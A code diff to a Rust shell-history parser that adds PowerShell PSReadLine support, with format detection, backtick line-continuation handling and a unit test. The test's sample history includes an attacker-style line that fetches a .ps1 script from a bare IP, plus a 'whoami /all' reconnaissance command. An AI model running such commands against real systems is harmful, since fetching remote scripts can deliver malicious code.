@@ -1,5 +1,6 @@
-//! Unix shell history files: bash's `.bash_history`, zsh's `.zsh_history`
-//! (or `.histfile`) and fish's `fish_history`.
+//! Shell history files: bash's `.bash_history`, zsh's `.zsh_history` (or
+//! `.histfile`), fish's `fish_history`, and PowerShell's PSReadLine history
+//! (`ConsoleHost_history.txt`).
 //!
 //! - **bash**: a command per line. With `HISTTIMEFORMAT` set, bash writes
 //!   `#<seconds>` before each command, and the lines up to the next time
@@ -10,6 +11,9 @@
 //!   next. Bytes zsh wrote escaped ("metafied") are restored.
 //! - **fish**: `- cmd: <command>`, `  when: <seconds>`, then the `paths:`
 //!   the command named.
+//! - **PowerShell** (PSReadLine, `…\PSReadLine\<host>Host_history.txt`): a
+//!   command per line, untimed; a line ending in a backtick goes on to the
+//!   next, as PSReadLine writes a multi-line command.
 //!
 //! Times are UTC. Bytes that aren't UTF-8 are replaced with U+FFFD. A line
 //! that can't be read is reported in `problems`, never fatal.
@@ -31,6 +35,8 @@ pub enum Format {
     Zsh,
     /// `fish_history`.
     Fish,
+    /// PSReadLine's `<host>Host_history.txt` (`ConsoleHost_history.txt`).
+    PowerShell,
 }
 
 /// One command.
@@ -103,6 +109,8 @@ pub fn detect(data: &[u8], name: Option<&str>) -> Format {
         .unwrap_or("");
     if file.ends_with("zsh_history") || file.ends_with("histfile") {
         Format::Zsh
+    } else if file.to_ascii_lowercase().ends_with("host_history.txt") {
+        Format::PowerShell
     } else if file.ends_with("fish_history") {
         Format::Fish
     } else {
@@ -129,6 +137,7 @@ pub fn parse_as(data: &[u8], format: Format) -> History {
         Format::Bash => bash(data, &mut history),
         Format::Zsh => zsh(data, &mut history),
         Format::Fish => fish(data, &mut history),
+        Format::PowerShell => powershell(data, &mut history),
     }
     history
 }
@@ -167,6 +176,29 @@ fn number<T: std::str::FromStr>(digits: &[u8]) -> Option<T> {
 fn bash_time(bytes: &[u8]) -> Option<&[u8]> {
     let rest = bytes.strip_prefix(b"#")?;
     rest.first().is_some_and(u8::is_ascii_digit).then_some(rest)
+}
+
+/// Read PSReadLine's history: a command per non-blank line, a trailing
+/// backtick joining the next line to it (the backtick removed); a UTF-8
+/// byte order mark skipped.
+fn powershell(data: &[u8], history: &mut History) {
+    let data = data.strip_prefix(b"\xef\xbb\xbf").unwrap_or(data);
+    let mut joined = false;
+    for line in lines(data) {
+        let (bytes, continues) = match line.bytes.strip_suffix(b"`") {
+            Some(head) => (head, true),
+            None => (line.bytes, false),
+        };
+        match history.commands.last_mut() {
+            Some(last) if joined => {
+                last.command.push('\n');
+                last.command.push_str(&text(bytes));
+            }
+            _ if bytes.is_empty() => {}
+            _ => history.commands.push(Command::new(line, text(bytes))),
+        }
+        joined = continues;
+    }
 }
 
 /// Read bash's history as bash does with `HISTTIMEFORMAT` set: after a
@@ -436,5 +468,39 @@ mod tests {
                 "line 6: not a fish history line"
             ]
         );
+    }
+}
+
+#[cfg(test)]
+mod powershell_tests {
+    use super::*;
+
+    #[test]
+    fn commands_and_backtick_continuations() {
+        let data = b"\xef\xbb\xbfGet-Process\r\n\r\nInvoke-WebRequest `\r\n  -Uri http://192.0.2.4/a.ps1\r\nwhoami /all\n";
+        let history = parse(
+            data,
+            Some(
+                r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+            ),
+        );
+        assert_eq!(history.format, Format::PowerShell);
+        let commands: Vec<&str> = history
+            .commands
+            .iter()
+            .map(|c| c.command.as_str())
+            .collect();
+        assert_eq!(
+            commands,
+            [
+                "Get-Process",
+                "Invoke-WebRequest \n  -Uri http://192.0.2.4/a.ps1",
+                "whoami /all"
+            ]
+        );
+        assert_eq!(history.commands[1].line, 3);
+        assert!(history.commands.iter().all(|c| c.time.is_none()));
+        // Only PSReadLine's names: another `*_history.txt` isn't PowerShell.
+        assert_eq!(detect(b"ls\n", Some("bash_history.txt")), Format::Bash);
     }
 }
